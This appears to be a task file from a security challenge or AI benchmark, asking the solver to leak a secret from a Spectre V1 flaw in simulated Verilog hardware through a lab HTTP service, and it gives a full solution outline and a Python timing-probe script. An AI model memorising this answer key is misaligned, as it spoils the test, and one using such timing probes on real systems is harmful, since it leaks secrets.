# Task 002: Spectre V1 Side-Channel Attack - Level 4

## Objective
Exploit a Spectre V1 vulnerability in Verilog RTL to leak a secret value.

## Hint Level: 4 (Complete)

You have access to an HTTP service running on `target:8000`.

## Solution Outline
1. Iterate through possible index values (0-255)
2. For each index, POST to /measure: {"index": value}
3. Measure the timing response
4. Higher timing indicates correct value
5. Use timing differences to determine the secret

## Example
```python
import requests

for index in range(256):
    response = requests.post(
        'http://target:8000/measure',
        json={"index": index}
    )
    timing = response.json()['timing']
    if timing > threshold:
        print(f"Secret value: {index}")
```
